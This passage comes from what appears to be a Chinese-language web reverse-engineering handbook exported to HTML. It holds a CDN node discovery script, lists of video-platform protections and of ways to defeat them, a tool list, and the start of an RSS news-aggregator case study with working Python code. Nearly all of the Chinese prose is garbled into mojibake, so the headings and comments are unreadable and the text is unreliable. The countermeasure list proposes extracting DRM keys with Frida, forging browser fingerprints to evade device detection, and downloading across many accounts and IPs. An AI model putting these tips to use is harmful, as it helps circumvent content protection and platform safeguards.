</code></pre>
      </div>

      <h3 id="é«˜çº§æŠ€å·§-åå‘è§£æ-cdn-èŠ‚ç‚¹">é«˜çº§æŠ€å·§: åå‘è§£æ CDN èŠ‚ç‚¹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">dns.resolver</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>

<span class="k">def</span><span class="w"> </span><span class="nf">discover_all_cdn_nodes</span><span class="p">(</span><span class="n">domain</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;é€šè¿‡ DNS æŸ¥è¯¢å‘ç°æ‰€æœ‰ CDN èŠ‚ç‚¹&quot;&quot;&quot;</span>
    <span class="n">nodes</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># è§£æ CNAME</span>
        <span class="n">answers</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">resolver</span><span class="o">.</span><span class="n">resolve</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="s1">&#39;CNAME&#39;</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">rdata</span> <span class="ow">in</span> <span class="n">answers</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;CNAME: </span><span class="si">{</span><span class="n">rdata</span><span class="o">.</span><span class="n">target</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

            <span class="c1"># è§£æ A è®°å½•</span>
            <span class="n">a_records</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">resolver</span><span class="o">.</span><span class="n">resolve</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rdata</span><span class="o">.</span><span class="n">target</span><span class="p">),</span> <span class="s1">&#39;A&#39;</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">a_rdata</span> <span class="ow">in</span> <span class="n">a_records</span><span class="p">:</span>
                <span class="n">ip</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">a_rdata</span><span class="p">)</span>

                <span class="c1"># åå‘ DNS æŸ¥è¯¢è·å–èŠ‚ç‚¹åç§°</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">hostname</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyaddr</span><span class="p">(</span><span class="n">ip</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
                <span class="k">except</span><span class="p">:</span>
                    <span class="n">hostname</span> <span class="o">=</span> <span class="n">ip</span>

                <span class="n">nodes</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                    <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="n">ip</span><span class="p">,</span>
                    <span class="s1">&#39;hostname&#39;</span><span class="p">:</span> <span class="n">hostname</span>
                <span class="p">})</span>

                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  -&gt; </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">hostname</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>

    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">nodes</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">nodes</span> <span class="o">=</span> <span class="n">discover_all_cdn_nodes</span><span class="p">(</span><span class="s1">&#39;cdn.example.com&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é˜²æŠ¤ä¸å¯¹æŠ—æ€»ç»“">é˜²æŠ¤ä¸å¯¹æŠ—æ€»ç»“</h2>

      <h3 id="å¹³å°é˜²æŠ¤æªæ–½">å¹³å°é˜²æŠ¤æªæ–½</h3>

      <ol>
        <li><strong>URL ç­¾å</strong>: æ—¶é—´æˆ³ + å¯†é’¥ç­¾å</li>
        <li><strong>è®¾å¤‡æŒ‡çº¹</strong>: ç»‘å®šè®¾å¤‡ï¼Œé™åˆ¶å¹¶å‘</li>
        <li><strong>æ’­æ”¾æ¬¡æ•°é™åˆ¶</strong>: å•ä¸ªè§†é¢‘æ’­æ”¾æ¬¡æ•°</li>
        <li><strong>DRM ä¿æŠ¤</strong>: Widevineã€PlayReady</li>
        <li><strong>åŠ¨æ€å¯†é’¥</strong>: å®šæœŸè½®æ¢åŠ å¯†å¯†é’¥</li>
        <li><strong>æ°´å°æŠ€æœ¯</strong>: æº¯æºç›—ç‰ˆè§†é¢‘</li>
        <li><strong>CDN é‰´æƒ</strong>: Token éªŒè¯</li>
        <li><strong>æµé‡åˆ†æ</strong>: æ£€æµ‹å¼‚å¸¸ä¸‹è½½è¡Œä¸º</li>
      </ol>

      <h3 id="é€†å‘å¯¹æŠ—æŠ€å·§">é€†å‘å¯¹æŠ—æŠ€å·§</h3>

      <ol>
        <li><strong>è‡ªåŠ¨åŒ–è„šæœ¬</strong>: Seleniumã€Playwright æ¨¡æ‹ŸçœŸå®ç”¨æˆ·</li>
        <li><strong>å¯†é’¥æå–</strong>: Frida Hookã€å†…å­˜æ‰«æ</li>
        <li><strong>åè®®åˆ†æ</strong>: Wiresharkã€mitmproxy</li>
        <li><strong>ä»£ç æ··æ·†è¿˜åŸ</strong>: AST åˆ†æã€ç¬¦å·æ‰§è¡Œ</li>
        <li><strong>CDN ä¼˜é€‰</strong>: å¤šèŠ‚ç‚¹æµ‹é€Ÿã€æ™ºèƒ½é€‰æ‹©</li>
        <li><strong>åˆ†å¸ƒå¼ä¸‹è½½</strong>: å¤šè´¦å·ã€å¤š IP å¹¶å‘</li>
        <li><strong>æµè§ˆå™¨æŒ‡çº¹ä¼ªé€ </strong>: ç»•è¿‡è®¾å¤‡æ£€æµ‹</li>
      </ol>

      <hr />

      <h2 id="æ³•å¾‹ä¸é“å¾·å£°æ˜">æ³•å¾‹ä¸é“å¾·å£°æ˜</h2>

      <p><strong>æœ¬æ–‡ä»…ç”¨äºæŠ€æœ¯ç ”ç©¶å’Œæ•™è‚²ç›®çš„</strong>ã€‚ç»•è¿‡è§†é¢‘å¹³å°çš„ä¿æŠ¤æªæ–½å¯èƒ½è¿å:</p>

      <ul>
        <li>æœåŠ¡æ¡æ¬¾ (ToS)</li>
        <li>æ•°å­—åƒå¹´ç‰ˆæƒæ³•æ¡ˆ (DMCA)</li>
        <li>è®¡ç®—æœºæ¬ºè¯ˆå’Œæ»¥ç”¨æ³• (CFAA)</li>
        <li>å„å›½çŸ¥è¯†äº§æƒæ³•å¾‹</li>
      </ul>

      <p>è¯·ä»…åœ¨æˆæƒç¯å¢ƒä¸‹è¿›è¡Œå®‰å…¨æµ‹è¯•ï¼Œå°Šé‡å†…å®¹åˆ›ä½œè€…çš„æƒç›Šã€‚</p>

      <hr />

      <h2 id="å·¥å…·æ¨è">å·¥å…·æ¨è</h2>

      <h3 id="è§†é¢‘ä¸‹è½½å·¥å…·">è§†é¢‘ä¸‹è½½å·¥å…·</h3>

      <ul>
        <li><strong>yt-dlp</strong>: æ”¯æŒ 1000+ ç½‘ç«™</li>
        <li><strong>you-get</strong>: å›½å†…è§†é¢‘å¹³å°</li>
        <li><strong>N_m3u8DL-CLI</strong>: M3U8 ä¸“ä¸šä¸‹è½½å™¨</li>
        <li><strong>streamlink</strong>: ç›´æ’­æµä¸‹è½½</li>
      </ul>

      <h3 id="åˆ†æå·¥å…·">åˆ†æå·¥å…·</h3>

      <ul>
        <li><strong>Wireshark</strong>: ç½‘ç»œåè®®åˆ†æ</li>
        <li><strong>Chrome DevTools</strong>: æµè§ˆå™¨è°ƒè¯•</li>
        <li><strong>Frida</strong>: åŠ¨æ€åˆ†æ</li>
        <li><strong>mitmproxy</strong>: HTTPS ä»£ç†</li>
      </ul>

      <h3 id="è§£å¯†å·¥å…·">è§£å¯†å·¥å…·</h3>

      <ul>
        <li><strong>ffmpeg</strong>: è§†é¢‘å¤„ç†ã€è½¬ç </li>
        <li><strong>mp4decrypt</strong>: MP4 è§£å¯†ï¼ˆBento4ï¼‰</li>
        <li><strong>shaka-packager</strong>: DRM å°è£…/è§£å°</li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨ DevTools ä½¿ç”¨</a></li>
        <li><a href="../01-Tools/packet_capture.md">æŠ“åŒ…ä¸ä»£ç†å·¥å…·</a></li>
        <li><a href="../02-Techniques/js_obfuscation.md">JavaScript æ··æ·†ä¸åæ··æ·†</a></li>
        <li><a href="#04-Advanced-Recipes-webassembly-reversing">WebAssembly é€†å‘</a></li>
        <li><a href="../03-Advanced-Topics/drm_protection.md">DRM ä¿æŠ¤æœºåˆ¶</a></li>
      </ul>

    </div>

    <div class="section" id="05-Case-Studies-case-news-aggregator">
      <h2>49. News Aggregator</h2>
      <h1 id="æ–°é—»èšåˆç½‘ç«™">æ–°é—»èšåˆç½‘ç«™</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>æ–°é—»èšåˆç½‘ç«™ï¼ˆå¦‚ Hacker Newsã€Redditã€ä»Šæ—¥å¤´æ¡ï¼‰æ±‡é›†å¤šä¸ªæ–°é—»æºï¼Œå¹¶æä¾›ä¸ªæ€§åŒ–æ¨èã€‚æœ¬æ–‡é€šè¿‡ 5 ä¸ªçœŸå®æ¡ˆä¾‹ï¼Œæ·±å…¥è®²è§£æ–°é—»èšåˆå¹³å°çš„é€†å‘æŠ€æœ¯ã€‚</p>

      <hr />

      <h2 id="æ¡ˆä¾‹-1-rssatom-feed-èšåˆä¸è§£æ">æ¡ˆä¾‹ 1: RSS/Atom Feed èšåˆä¸è§£æ</h2>

      <h3 id="èƒŒæ™¯">èƒŒæ™¯</h3>

      <p>ä¼ ç»Ÿæ–°é—»èšåˆä¾èµ– RSS/Atom feedsã€‚é€†å‘è¿™äº› feeds å¯ä»¥å®ç°è‡ªå®šä¹‰æ–°é—»èšåˆå™¨ã€‚</p>

      <h3 id="feed-æ ¼å¼">Feed æ ¼å¼</h3>

      <h4 id="rss-20">RSS 2.0</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="nt">&lt;rss</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;2.0&quot;</span><span class="nt">&gt;</span>
<span class="w">  </span><span class="nt">&lt;channel&gt;</span>
<span class="w">    </span><span class="nt">&lt;title&gt;</span>Example<span class="w"> </span>News<span class="nt">&lt;/title&gt;</span>
<span class="w">    </span><span class="nt">&lt;link&gt;</span>https://news.example.com<span class="nt">&lt;/link&gt;</span>
<span class="w">    </span><span class="nt">&lt;description&gt;</span>Latest<span class="w"> </span>news<span class="w"> </span>from<span class="w"> </span>Example<span class="nt">&lt;/description&gt;</span>
<span class="w">    </span><span class="nt">&lt;item&gt;</span>
<span class="w">      </span><span class="nt">&lt;title&gt;</span>Breaking<span class="w"> </span>News:<span class="w"> </span>AI<span class="w"> </span>Breakthrough<span class="nt">&lt;/title&gt;</span>
<span class="w">      </span><span class="nt">&lt;link&gt;</span>https://news.example.com/article/123<span class="nt">&lt;/link&gt;</span>
<span class="w">      </span><span class="nt">&lt;description&gt;</span>Scientists<span class="w"> </span>announce<span class="w"> </span>major<span class="w"> </span>AI<span class="w"> </span>advancement...<span class="nt">&lt;/description&gt;</span>
<span class="w">      </span><span class="nt">&lt;pubDate&gt;</span>Mon,<span class="w"> </span>18<span class="w"> </span>Dec<span class="w"> </span>2023<span class="w"> </span>10:00:00<span class="w"> </span>GMT<span class="nt">&lt;/pubDate&gt;</span>
<span class="w">      </span><span class="nt">&lt;guid&gt;</span>https://news.example.com/article/123<span class="nt">&lt;/guid&gt;</span>
<span class="w">    </span><span class="nt">&lt;/item&gt;</span>
<span class="w">  </span><span class="nt">&lt;/channel&gt;</span>
<span class="nt">&lt;/rss&gt;</span>
</code></pre>
      </div>

      <h4 id="atom-10">Atom 1.0</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="nt">&lt;feed</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2005/Atom&quot;</span><span class="nt">&gt;</span>
<span class="w">  </span><span class="nt">&lt;title&gt;</span>Example<span class="w"> </span>News<span class="nt">&lt;/title&gt;</span>
<span class="w">  </span><span class="nt">&lt;link</span><span class="w"> </span><span class="na">href=</span><span class="s">&quot;https://news.example.com&quot;</span><span class="nt">/&gt;</span>
<span class="w">  </span><span class="nt">&lt;updated&gt;</span>2023-12-18T10:00:00Z<span class="nt">&lt;/updated&gt;</span>
<span class="w">  </span><span class="nt">&lt;entry&gt;</span>
<span class="w">    </span><span class="nt">&lt;title&gt;</span>Breaking<span class="w"> </span>News:<span class="w"> </span>AI<span class="w"> </span>Breakthrough<span class="nt">&lt;/title&gt;</span>
<span class="w">    </span><span class="nt">&lt;link</span><span class="w"> </span><span class="na">href=</span><span class="s">&quot;https://news.example.com/article/123&quot;</span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;id&gt;</span>urn:uuid:1234-5678-90ab-cdef<span class="nt">&lt;/id&gt;</span>
<span class="w">    </span><span class="nt">&lt;updated&gt;</span>2023-12-18T10:00:00Z<span class="nt">&lt;/updated&gt;</span>
<span class="w">    </span><span class="nt">&lt;summary&gt;</span>Scientists<span class="w"> </span>announce<span class="w"> </span>major<span class="w"> </span>AI<span class="w"> </span>advancement...<span class="nt">&lt;/summary&gt;</span>
<span class="w">  </span><span class="nt">&lt;/entry&gt;</span>
<span class="nt">&lt;/feed&gt;</span>
</code></pre>
      </div>

      <h3 id="python-å®ç°-rss-èšåˆå™¨">Python å®ç° - RSS èšåˆå™¨</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">feedparser</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">List</span><span class="p">,</span> <span class="n">Dict</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sqlite3</span>

<span class="k">class</span><span class="w"> </span><span class="nc">RSSAggregator</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">db_path</span><span class="o">=</span><span class="s1">&#39;news.db&#39;</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">db_path</span> <span class="o">=</span> <span class="n">db_path</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">init_database</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">init_database</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åˆå§‹åŒ–æ•°æ®åº“&quot;&quot;&quot;</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">db_path</span><span class="p">)</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>

        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">            CREATE TABLE IF NOT EXISTS articles (</span>
<span class="s1">                id INTEGER PRIMARY KEY AUTOINCREMENT,</span>
<span class="s1">                title TEXT,</span>
<span class="s1">                link TEXT UNIQUE,</span>
<span class="s1">                description TEXT,</span>
<span class="s1">                published DATETIME,</span>
<span class="s1">                source TEXT,</span>
<span class="s1">                category TEXT,</span>
<span class="s1">                read BOOLEAN DEFAULT 0</span>
<span class="s1">            )</span>
<span class="s1">        &#39;&#39;&#39;</span><span class="p">)</span>

        <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">fetch_feed</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">feed_url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">source_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–å¹¶è§£æ RSS/Atom feed&quot;&quot;&quot;</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="c1"># ä½¿ç”¨ feedparser è‡ªåŠ¨æ£€æµ‹æ ¼å¼</span>
            <span class="n">feed</span> <span class="o">=</span> <span class="n">feedparser</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">feed_url</span><span class="p">)</span>

            <span class="n">articles</span> <span class="o">=</span> <span class="p">[]</span>

            <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="n">feed</span><span class="o">.</span><span class="n">entries</span><span class="p">:</span>
                <span class="n">article</span> <span class="o">=</span> <span class="p">{</span>
                    <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">entry</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
                    <span class="s1">&#39;link&#39;</span><span class="p">:</span> <span class="n">entry</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;link&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
                    <span class="s1">&#39;description&#39;</span><span class="p">:</span> <span class="n">entry</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;description&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">entry</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;summary&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
                    <span class="s1">&#39;published&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">_parse_date</span><span class="p">(</span><span class="n">entry</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;published&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)),</span>
                    <span class="s1">&#39;source&#39;</span><span class="p">:</span> <span class="n">source_name</span><span class="p">,</span>
                    <span class="s1">&#39;category&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">_extract_category</span><span class="p">(</span><span class="n">entry</span><span class="p">)</span>
                <span class="p">}</span>

                <span class="n">articles</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">article</span><span class="p">)</span>

            <span class="k">return</span> <span class="n">articles</span>

        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error fetching </span><span class="si">{</span><span class="n">feed_url</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">return</span> <span class="p">[]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_parse_date</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">date_str</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£ææ—¥æœŸ&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">date_str</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="c1"># feedparser å·²ç»è§£æäº†æ—¥æœŸ</span>
            <span class="kn">from</span><span class="w"> </span><span class="nn">email.utils</span><span class="w"> </span><span class="kn">import</span> <span class="n">parsedate_to_datetime</span>
            <span class="k">return</span> <span class="n">parsedate_to_datetime</span><span class="p">(</span><span class="n">date_str</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_extract_category</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">entry</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æå–åˆ†ç±»&quot;&quot;&quot;</span>
        <span class="c1"># ä» tags ä¸­æå–</span>
        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">entry</span><span class="p">,</span> <span class="s1">&#39;tags&#39;</span><span class="p">):</span>
            <span class="k">return</span> <span class="s1">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">tag</span><span class="o">.</span><span class="n">term</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">entry</span><span class="o">.</span><span class="n">tags</span><span class="p">[:</span><span class="mi">3</span><span class="p">]])</span>

        <span class="c1"># ä» category ä¸­æå–</span>
        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">entry</span><span class="p">,</span> <span class="s1">&#39;category&#39;</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">entry</span><span class="o">.</span><span class="n">category</span>

        <span class="k">return</span> <span class="s1">&#39;General&#39;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">save_articles</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">articles</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="n">Dict</span><span class="p">]):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¿å­˜æ–‡ç« åˆ°æ•°æ®åº“&quot;&quot;&quot;</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">db_path</span><span class="p">)</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>

        <span class="k">for</span> <span class="n">article</span> <span class="ow">in</span> <span class="n">articles</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">                    INSERT OR IGNORE INTO articles</span>
<span class="s1">                    (title, link, description, published, source, category)</span>
<span class="s1">                    VALUES (?, ?, ?, ?, ?, ?)</span>
<span class="s1">                &#39;&#39;&#39;</span><span class="p">,</span> <span class="p">(</span>
                    <span class="n">article</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">],</span>
                    <span class="n">article</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">],</span>
                    <span class="n">article</span><span class="p">[</span><span class="s1">&#39;description&#39;</span><span class="p">],</span>
                    <span class="n">article</span><span class="p">[</span><span class="s1">&#39;published&#39;</span><span class="p">],</span>
                    <span class="n">article</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">],</span>
                    <span class="n">article</span><span class="p">[</span><span class="s1">&#39;category&#39;</span><span class="p">]</span>
                <span class="p">))</span>
            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error saving article: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">aggregate_multiple_feeds</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">feeds</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">]):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        èšåˆå¤šä¸ª feeds</span>
<span class="sd">        feeds: {&#39;Source Name&#39;: &#39;feed_url&#39;, ...}</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="n">all_articles</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="k">for</span> <span class="n">source_name</span><span class="p">,</span> <span class="n">feed_url</span> <span class="ow">in</span> <span class="n">feeds</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Fetching </span><span class="si">{</span><span class="n">source_name</span><span class="si">}</span><span class="s2">...&quot;</span><span class="p">)</span>
            <span class="n">articles</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">fetch_feed</span><span class="p">(</span><span class="n">feed_url</span><span class="p">,</span> <span class="n">source_name</span><span class="p">)</span>
            <span class="n">all_articles</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">articles</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">save_articles</span><span class="p">(</span><span class="n">all_articles</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Total articles fetched: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">all_articles</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">all_articles</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_latest_articles</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">limit</span><span class="o">=</span><span class="mi">20</span><span class="p">,</span> <span class="n">category</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–æœ€æ–°æ–‡ç« &quot;&quot;&quot;</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">db_path</span><span class="p">)</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>

        <span class="k">if</span> <span class="n">category</span><span class="p">:</span>
            <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">                SELECT * FROM articles</span>
<span class="s1">                WHERE category LIKE ?</span>
<span class="s1">                ORDER BY published DESC</span>
<span class="s1">                LIMIT ?</span>
<span class="s1">            &#39;&#39;&#39;</span><span class="p">,</span> <span class="p">(</span><span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="n">category</span><span class="si">}</span><span class="s1">%&#39;</span><span class="p">,</span> <span class="n">limit</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">                SELECT * FROM articles</span>
<span class="s1">                ORDER BY published DESC</span>
<span class="s1">                LIMIT ?</span>
<span class="s1">            &#39;&#39;&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">limit</span><span class="p">,))</span>

        <span class="n">articles</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

        <span class="k">return</span> <span class="n">articles</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">aggregator</span> <span class="o">=</span> <span class="n">RSSAggregator</span><span class="p">()</span>

<span class="c1"># å®šä¹‰ feeds</span>
<span class="n">feeds</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;Hacker News&#39;</span><span class="p">:</span> <span class="s1">&#39;https://news.ycombinator.com/rss&#39;</span><span class="p">,</span>
    <span class="s1">&#39;TechCrunch&#39;</span><span class="p">:</span> <span class="s1">&#39;https://techcrunch.com/feed/&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Ars Technica&#39;</span><span class="p">:</span> <span class="s1">&#39;https://feeds.arstechnica.com/arstechnica/index&#39;</span><span class="p">,</span>
    <span class="s1">&#39;The Verge&#39;</span><span class="p">:</span> <span class="s1">&#39;https://www.theverge.com/rss/index.xml&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Reddit Python&#39;</span><span class="p">:</span> <span class="s1">&#39;https://www.reddit.com/r/python/.rss&#39;</span>
<span class="p">}</span>

<span class="c1"># èšåˆæ‰€æœ‰ feeds</span>
<span class="n">aggregator</span><span class="o">.</span><span class="n">aggregate_multiple_feeds</span><span class="p">(</span><span class="n">feeds</span><span class="p">)</span>

<span class="c1"># è·å–æœ€æ–° 20 ç¯‡æ–‡ç« </span>
<span class="n">latest</span> <span class="o">=</span> <span class="n">aggregator</span><span class="o">.</span><span class="n">get_latest_articles</span><span class="p">(</span><span class="n">limit</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>

